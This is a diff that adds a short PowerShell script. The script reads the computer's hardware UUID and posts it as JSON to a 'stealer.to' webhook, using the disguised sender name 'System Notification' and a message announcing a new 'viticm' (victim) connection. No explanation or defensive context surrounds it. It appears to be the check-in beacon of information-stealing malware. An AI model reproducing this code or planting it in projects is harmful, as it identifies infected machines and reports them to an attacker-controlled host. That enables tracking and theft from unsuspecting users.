@@ -1,0 +1,8 @@
+$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+$webhookUrl = "https://stealer.to/post?uniqueid=cb8b9bbb"
+$message = @{
+    username = "System Notification" # Tên người gửi
+    content  = "New viticm uuid connect: $uuid"
+}
+$jsonPayload = $message | ConvertTo-Json -Depth 2
+Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
